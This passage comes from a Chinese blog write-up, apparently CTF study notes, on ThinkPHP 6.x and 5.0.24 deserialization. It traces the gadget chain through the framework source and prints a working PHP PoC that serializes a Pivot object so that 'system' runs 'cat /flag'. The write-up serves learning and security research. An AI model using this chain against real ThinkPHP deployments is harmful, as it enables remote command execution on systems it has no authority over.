class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟踪<code>updateData</code>函数，一行一行看过去，可以在<code>    $allowFields = $this-&gt;checkAllowFields();</code>跳转到<code>checkAllowFields</code>函数之后可以发现存在我们可控的字符串拼接，也就是说可以利用<code>toString</code>方法</p>
<p><img src="http://82.156.2.166/img/iamthinking/check.png"></p>
<p>跟踪<code>ModelEvent/trigger函数</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . Str::studly(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists(<span class="built_in">static</span>::class, <span class="variable">$call</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = call_user_func([<span class="built_in">static</span>::class, <span class="variable">$call</span>], <span class="keyword">$this</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_object(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; method_exists(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;trigger(<span class="built_in">static</span>::class . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="keyword">$this</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : end(<span class="variable">$result</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里我觉得<code>call_user_func([static::class, $call], $this)</code>这段代码有点可疑，但是由于对php一些语法还是不是很理解，比如对这个函数里面的<code>[static::class, $call], $this</code>就不是很理解，然后这里的<code>$call</code>在前面又会有字符串的拼接，所以应该是利用不了的，所以还是直接去找<code>toString</code>方法吧</p>
<p>3.找可利用的<code>__toString</code></p>
<p>全局搜索<code>toString</code>方法，可以在<code>Collection.php</code>和<code>Conversion.php</code>中遇到可以利用的方法，但是在<code>Collection</code>中，函数在进行到<code>toArray</code>之后就停止了，并没有可利用的点，那我们来分析<code>Conversion.php</code></p>
<p><code>__toString</code>，跟踪<code>toJson</code>方法，是对数据进行json加密，跟踪<code>toArray</code></p>
<p><img src="http://82.156.2.166/img/iamthinking/toString.png"></p>
<p><code>Conversion/toArray</code>，前半段都不会影响什么，直接跟踪<code>appendAttrToArray</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       ……</span><br><span class="line">       ……</span><br><span class="line">       ……</span><br><span class="line">       <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;appendAttrToArray(<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment"># 传入item 以及append中的键 值</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Conversion/appendAttrToArray</code>，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">appendAttrToArray</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">           <span class="comment">// 追加关联对象属性</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">           <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment">// 追加关联对象属性</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$value</span>       = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>); <span class="comment"># 将值传进去</span></span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;getBindAttr(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$item</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getAttr</code>，跟踪getData，大概会返回<code>$this-&gt;data[$name]</code>，直接跟踪getValue</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">           <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>); <span class="comment"># 返回$this-&gt;data[$name]</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;isRelationAttr(<span class="variable">$name</span>);</span><br><span class="line">           <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment"># $name = $name $value = $this-&gt;data[$name] $relation = false</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getData</code>,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>); </span><br><span class="line">    	<span class="comment"># 使得 $fieldName = $name</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="comment"># 如果键存在则返回值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getRealFieldName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? <span class="variable">$name</span> : Str::snake(<span class="variable">$name</span>);</span><br><span class="line">    	<span class="comment"># 直接返回name </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getValue</code>，可以发现如果<code>$this-&gt;withAttr[$fieldName]</code>不是数组的话，就直接进入<code>$closure($value, $this-&gt;data);</code>，看注释掉的内容，也可以意识到这里就是可以直接执行代码的地方了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 检测属性获取器</span></span><br><span class="line">       <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>);</span><br><span class="line">       <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . Str::studly(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getRelationValue(<span class="variable">$relation</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (in_array(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getJsonValue(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">//$fieldName = a</span></span><br><span class="line">               <span class="comment">//withAttr[a] = system</span></span><br><span class="line">               <span class="variable">$closure</span> = <span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">               <span class="comment">//value = system(ls,)</span></span><br><span class="line">               <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">           ……………………</span><br></pre></td></tr></table></figure>

<p>思路总结1：</p>
<blockquote>
<ol>
<li>先触发Model类的__destruct方法，使得$this-&gt;lazySave为true进入save函数</li>
<li>要求$this-&gt;withEvent为false，$this-&gt;data不为空，$this-&gt;exits为true，进入updateData函数</li>
<li>直接进入Attribute类的getChangedData函数，会因为之后要去check，所以不能在下一个if语句里return掉，所以返回的$data不能为空，所以要求Attribute里面的$this-&gt;force为true，$this-&gt;data要有值，进入Model，checkAllowFields函数</li>
<li>进入if，要求$this-&gt;field和$this-&gt;schema都为空，在这里$this-&gt;table . $this-&gt;suffix触发Conversion类的toString方法，所以要求$this-&gt;table为true，$this-&gt;suffix实例化Conversion</li>
<li>进入Conversion类，进入toArray函数，进入Attribute类的getAttr函数，传键值，进入getData函数，传入的值不能为空，进入getRealFieldName函数，要求$this-&gt;strict为true，使得直接返回$name，然后要在键值要存在于$this-&gt;data中，使得直接返回$this-&gt;data[$name]，最后以$name=$key $value=$this-&gt;data[$name] $relation=false进入getValue函数</li>
<li>进入if，要求$this-&gt;withAttr[$name]有值并且不是数组，进入$closure = $this-&gt;withAttr[$fieldName];$closure($value, $this-&gt;data);进行代码执行</li>
</ol>
</blockquote>
<p>总结2：</p>
<blockquote>
<p>Model: $this-&gt;lazySave = true;    $this-&gt;withEvent = false;    $this-&gt;exits = true;    $this-&gt;data = [];    $this-&gt;table = true;    $this-&gt;suffix = new Conversion();    $this-&gt;field = [];    $this-&gt;schema = [];</p>
<p>Attribute: $this-&gt;force = true;    $this-&gt;data = [$name=&gt;’cat /flag’];    $this-&gt;strict = true;    $this-&gt;withAttr = [$name=&gt;’system’];    </p>
</blockquote>
<p>poc:（网上的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;hu3sky&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">&quot;hu3sky&quot;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(&#x27;&#x27;);</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> think\model\Pivot(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>poc：（我自己写的 出错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">force</span> = <span class="title">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;strict = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span> <span class="title">as</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span> <span class="title">as</span> <span class="title">ConcernConversion</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernConversion</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exits = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;1&quot;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = <span class="keyword">new</span> ConcernConversion();	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Model</span>();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后生成的payload，注意这里存在<code>parse_url</code>解析漏洞，像之前一样绕过就好了</p>
<p><strong>后记：</strong></p>
<p>总的来说，还是对thinkphp框架不够理解，对namespace和use关键字的运用理解不能</p>
<p>这两天除了这道题，参加的比赛也都要审计大量的代码，感觉头昏脑胀的（悲</p>
<p>代码一看得多了，再加上有些代码还是不能理解透，所以过程中思绪就会有点乱</p>
<p>再努力吧</p>
<h2 id="Thinkphp5-0-24反序列化"><a href="#Thinkphp5-0-24反序列化" class="headerlink" title="Thinkphp5.0.24反序列化"></a>Thinkphp5.0.24反序列化</h2><p><a href="http://www.thinkphp.cn/donate/download/id/1279.html">Thinkphp5.0.24</a></p>
<p><strong>0x01:</strong></p>
<p>因为已经知道是反序列化漏洞了，所以直接审计代码吧。一般常用的魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct</span><br><span class="line">__destruct</span><br><span class="line">__toString</span><br><span class="line">__wakeup</span><br><span class="line">__get</span><br><span class="line">__invoke</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>所以我们可以先自行全局搜索一下可用的魔术方法</p>
<p>1.<code>__destruct</code></p>
<p>一共搜到四个，暂时发现可利用的有一个<code>Windows.php</code>里面的存在可触发<code>toString</code>的点，那就先直接从这里开始</p>
<p>首先是<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;close(); <span class="comment"># 关闭文件</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;removeFiles(); <span class="comment"># 删除文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># removeFiles</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123; <span class="comment"># 可以触发toString</span></span><br><span class="line">                @unlink(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/de2f1ec402c146c19e084561c3289b84.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那之后可以去找一下<code>toString</code>方法</p>
<p>2.<code>__toString</code></p>
<p>因为前面审计了6.x的反序列化漏洞，所以再找到Model类的时候就直接看了，继续跟踪函数</p>
<p><code>toArray</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$item</span>    = [];</span><br><span class="line">       <span class="variable">$visible</span> = [];</span><br><span class="line">       <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">       <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation); <span class="comment"># 合并两个数组</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 过滤属性</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123; <span class="comment"># 如果$this-&gt;visible不为空</span></span><br><span class="line">           <span class="comment"># 如果是比较简单的格式则只会返回值，若值是数组则返回键，若是a.b的格式，会返回a ($this-&gt;visible的内容)</span></span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">           <span class="comment"># array_intersect_key 使用键名比较计算数组的交集 返回前面数组的内容</span></span><br><span class="line">           <span class="comment"># array_flip 交换数组中的键和值</span></span><br><span class="line">           <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">           <span class="comment"># 比较两个数组的差值</span></span><br><span class="line">           <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// 关联模型对象</span></span><br><span class="line">               <span class="comment"># 再执行一边toArray 在思考elseif里面可以不可以触发__call魔术方法</span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">               <span class="comment">// 关联模型数据集</span></span><br><span class="line">               <span class="variable">$arr</span> = [];</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                   <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 模型属性 直接返回$this-&gt;data </span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123; 